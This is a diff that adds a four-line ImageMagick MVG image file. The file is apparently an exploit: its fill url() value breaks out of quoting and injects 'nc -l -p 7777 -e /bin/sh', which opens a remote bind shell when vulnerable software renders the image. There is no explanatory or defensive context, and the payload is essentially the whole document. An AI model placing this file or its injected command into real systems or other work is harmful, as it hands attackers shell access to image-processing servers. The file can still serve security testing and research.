@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|nc -l -p 7777 -e"/bin/sh)'
+pop graphic-context
